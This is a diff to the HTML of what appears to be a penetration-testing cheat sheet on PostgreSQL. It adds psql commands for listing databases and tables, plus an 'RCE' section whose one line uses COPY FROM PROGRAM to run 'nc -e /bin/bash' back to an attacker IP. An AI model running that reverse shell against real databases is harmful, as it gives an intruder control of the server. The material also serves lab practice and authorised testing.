@@ -45,12 +45,19 @@
 <h4 id="connect-to-postgresql-database">Connect to postgresql Database</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psql -h 127.0.0.1 -U user -p <span class="m">5432</span> -d database
 </span></span></code></pre></div><h4 id="basic-commands">Basic Commands</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Dump data from table</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show databases</span>
+</span></span><span class="line"><span class="cl"><span class="se">\l</span>ist
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show tables in current database</span>
+</span></span><span class="line"><span class="cl"><span class="se">\d</span>t
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Dump data from table</span>
 </span></span><span class="line"><span class="cl"><span class="k">select</span> * from table_name<span class="p">;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Insert data into table (e.g)</span>
 </span></span><span class="line"><span class="cl">insert into table_name <span class="o">(</span>username, password, role<span class="o">)</span> values <span class="o">(</span><span class="s1">&#39;user&#39;</span>, <span class="s1">&#39;password&#39;</span>, <span class="s1">&#39;admin&#39;</span><span class="o">)</span><span class="p">;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Exit</span>
 </span></span><span class="line"><span class="cl"><span class="se">\q</span>
+</span></span></code></pre></div><h3 id="rce">RCE</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Only superuser</span>
+</span></span><span class="line"><span class="cl">CREATE TABLE IF NOT EXISTS exec<span class="o">(</span>string text<span class="o">)</span><span class="p">;</span> COPY <span class="nb">exec</span> FROM PROGRAM <span class="s1">&#39;nc -e /bin/bash 10.10.14.10 1337 &amp;&#39;</span>
 </span></span></code></pre></div><br></div></div>
     
     <script src="/js/utils.js"></script>
